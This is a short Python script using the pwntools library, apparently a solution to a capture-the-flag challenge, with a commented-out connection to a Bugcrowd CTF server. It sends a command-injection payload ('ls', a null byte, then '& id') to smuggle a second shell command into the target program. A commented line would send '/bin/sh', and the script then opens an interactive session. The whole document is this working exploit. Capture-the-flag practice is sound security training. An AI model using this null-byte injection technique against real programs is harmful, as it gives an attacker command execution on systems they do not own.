from pwn import *
p=process('./chal')
#p=remote('challenges.bhusa.bugcrowdctf.com', 8084)
payload=b'ls'+b'\x00'+b'& id'
#input()
p.sendline(payload)
#p.sendline(b'/bin/sh')
p.interactive()
